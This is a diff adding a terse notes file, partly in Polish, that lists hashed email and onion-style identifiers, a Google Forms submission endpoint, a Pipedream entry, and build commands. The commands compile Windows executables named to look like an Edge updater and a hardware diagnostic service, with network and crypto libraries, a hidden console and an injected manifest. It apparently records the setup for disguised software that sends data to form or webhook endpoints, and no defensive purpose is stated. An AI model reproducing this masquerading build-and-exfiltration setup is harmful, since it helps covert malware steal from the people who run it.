@@ -1,0 +1,31 @@
+md5 uonion cab5a2cff9095f96e0bb416ea411631c Cab5a2cff9095f96e0bb416ea411631c@proton.me cab5a2cff9095@wp.pl cab5a2cff9095f96e0bb416ea411631c  Cab5a2cff9095f96e0bb416ea411631c!
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSe4FsrRpmN3jmvE-btqPqEjg-KdTwa32mNXaMrJ2gu71N-rdQ/viewform?usp=pp_url&entry.2137496896=test
+
+https://docs.google.com/forms/d/e/1FAIpQLSe4FsrRpmN3jmvE-btqPqEjg-KdTwa32mNXaMrJ2gu71N-rdQ/formResponse
+
+na godlewandri
+
+
+md5 honion d42802a42285f1f483a1a532dcf99a4a d42802a42285f1f483a1a532dcf99a4a@proton.me
+
+pipedream D42802a42285f1f483a1a532dcf99a4a@proton.me
+
+cl /EHsc /O2 /MT main.cpp /Fe:EdgeUpdateCore.exe wininet.lib user32.lib advapi32.lib shell32.lib
+
+
+rc version.rc
+cl /EHsc /O2 /MT /std:c++14 main.cpp version.res /Fe:HardwareDiagnosticService.exe wininet.lib user32.lib advapi32.lib shell32.lib crypt32.lib
+mt.exe -manifest HardwareDiagnostic.manifest -outputresource:HardwareDiagnosticService.exe;#1
+
+
+:: 1. Kompilacja pliku zasobów (.rc) do pliku binarnego (.res)
+rc.exe /v version.rc
+
+:: 2. Kompilacja kodu źródłowego i linkowanie w trybie okienkowym (ukryta konsola) wraz z zasobami
+cl.exe /O2 /EHsc /W3 main2.cpp version.res /link /SUBSYSTEM:WINDOWS /OUT:HardwareDiagnosticService.exe
+
+:: 3. Wstrzyknięcie manifestu (wymaganie stabilności i legendy diagnostycznej) do pliku exe
+mt.exe -manifest HardwareDiagnostic.manifest -outputresource:HardwareDiagnosticService.exe;#1
+
